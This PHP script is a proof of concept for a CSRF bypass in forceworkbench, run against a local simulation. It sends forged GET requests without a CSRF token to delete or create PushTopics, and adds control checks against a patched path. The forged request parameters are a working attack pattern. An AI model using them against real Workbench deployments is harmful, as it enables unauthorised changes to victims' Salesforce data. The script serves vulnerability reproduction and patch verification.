<?php
declare(strict_types=1);

require_once __DIR__ . '/vulnerable_app/forceworkbench_streaming_sim.php';

function dump_json(string $label, array $value): void
{
    echo $label . PHP_EOL;
    echo json_encode($value, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . PHP_EOL;
}

function has_state_change(array $result, string $method, string $urlContains): bool
{
    foreach ($result['state_changing_rest_calls'] as $call) {
        if ($call['method'] === $method && str_contains($call['url'], $urlContains)) {
            return true;
        }
    }
    return false;
}

$failed = false;

$deleteAttackParams = [
    'PUSH_TOPIC_DML' => 'DELETE',
    'pushTopicDmlForm_Id' => '0TOCSRFVictimTopic',
    'pushTopicDmlForm_Name' => 'VictimTopic',
    'pushTopicDmlForm_ApiVersion' => '65.0',
    'pushTopicDmlForm_Query' => 'SELECT Id, Name FROM Account',
    // Deliberately no CSRF_TOKEN.
];

$saveAttackParams = [
    'PUSH_TOPIC_DML' => 'SAVE',
    'pushTopicDmlForm_Id' => 'undefined',
    'pushTopicDmlForm_Name' => 'CSRF_Created_Topic',
    'pushTopicDmlForm_ApiVersion' => '65.0',
    'pushTopicDmlForm_Query' => 'SELECT Id, Name FROM Account',
    // Deliberately no CSRF_TOKEN.
];

$validSaveParams = $saveAttackParams + ['CSRF_TOKEN' => fw_csrf_token()];

$intro = [
    'finding' => 'forceworkbench/forceworkbench CAND-7fa3da65590e',
    'vulnerability' => 'CSRF token bypass / unsafe GET state-changing action',
    'root_cause' => [
        'workbench/session.php validates CSRF only when REQUEST_METHOD != GET',
        'workbench/controllers/StreamingController.php uses $_REQUEST to dispatch PUSH_TOPIC_DML SAVE/DELETE',
    ],
    'safety' => 'This PoC is a local-only simulation. It never contacts Salesforce or any external service.',
];

dump_json('[*] PoC context:', $intro);

echo PHP_EOL . '[*] Attack 1: forged GET DELETE without CSRF_TOKEN against vulnerable path.' . PHP_EOL;
$vulnDelete = fw_run_vulnerable_streaming_request('GET', $deleteAttackParams);
dump_json('[*] Vulnerable GET DELETE result:', $vulnDelete);

if (
    $vulnDelete['http_status'] === 200 &&
    $vulnDelete['csrf_checks'] === 0 &&
    has_state_change($vulnDelete, 'DELETE', '/sobjects/PushTopic/0TOCSRFVictimTopic')
) {
    echo '[PASS] Vulnerability reproduced: GET skipped CSRF and triggered PushTopic DELETE.' . PHP_EOL;
} else {
    echo '[FAIL] Expected vulnerable GET DELETE to trigger state-changing REST DELETE without CSRF.' . PHP_EOL;
    $failed = true;
}

echo PHP_EOL . '[*] Attack 2: forged GET SAVE without CSRF_TOKEN against vulnerable path.' . PHP_EOL;
$vulnSave = fw_run_vulnerable_streaming_request('GET', $saveAttackParams);
dump_json('[*] Vulnerable GET SAVE result:', $vulnSave);

if (
    $vulnSave['http_status'] === 200 &&
    $vulnSave['csrf_checks'] === 0 &&
    has_state_change($vulnSave, 'POST', '/sobjects/PushTopic')
) {
    echo '[PASS] Vulnerability reproduced: GET skipped CSRF and triggered PushTopic CREATE.' . PHP_EOL;
} else {
    echo '[FAIL] Expected vulnerable GET SAVE to trigger state-changing REST POST without CSRF.' . PHP_EOL;
    $failed = true;
}

echo PHP_EOL . '[*] Control 1: forged POST without CSRF_TOKEN against vulnerable global gate.' . PHP_EOL;
$vulnPostNoToken = fw_run_vulnerable_streaming_request('POST', $saveAttackParams);
dump_json('[*] Vulnerable POST without token result:', $vulnPostNoToken);

if (
    $vulnPostNoToken['http_status'] === 403 &&
    $vulnPostNoToken['csrf_checks'] === 1 &&
    count($vulnPostNoToken['state_changing_rest_calls']) === 0
) {
    echo '[PASS] Control passed: non-GET requests are CSRF-checked; the bug is the GET + $_REQUEST bypass.' . PHP_EOL;
} else {
    echo '[FAIL] Expected tokenless POST to be rejected by the vulnerable global CSRF gate.' . PHP_EOL;
    $failed = true;
}

echo PHP_EOL . '[*] Control 2: same forged GET DELETE against patched path.' . PHP_EOL;
$patchedGet = fw_run_patched_streaming_request('GET', $deleteAttackParams);
dump_json('[*] Patched GET DELETE result:', $patchedGet);

if (
    $patchedGet['http_status'] === 405 &&
    count($patchedGet['state_changing_rest_calls']) === 0
) {
    echo '[PASS] Patched control passed: GET DML is rejected before any state change.' . PHP_EOL;
} else {
    echo '[FAIL] Expected patched path to reject GET DML with no state change.' . PHP_EOL;
    $failed = true;
}

echo PHP_EOL . '[*] Control 3: legitimate POST SAVE with valid CSRF_TOKEN against patched path.' . PHP_EOL;
$patchedPostValid = fw_run_patched_streaming_request('POST', $validSaveParams);
dump_json('[*] Patched POST with token result:', $patchedPostValid);

if (
    $patchedPostValid['http_status'] === 200 &&
    $patchedPostValid['csrf_checks'] === 1 &&
    has_state_change($patchedPostValid, 'POST', '/sobjects/PushTopic')
) {
    echo '[PASS] Patched positive control passed: POST plus valid CSRF token still permits intended SAVE.' . PHP_EOL;
} else {
    echo '[FAIL] Expected patched path to allow legitimate POST with a valid CSRF token.' . PHP_EOL;
    $failed = true;
}

if ($failed) {
    echo PHP_EOL . 'NOT REPRODUCED: one or more checks failed.' . PHP_EOL;
    exit(1);
}

echo PHP_EOL . 'VULNERABLE: forceworkbench CAND-7fa3da65590e reproduced successfully.' . PHP_EOL;
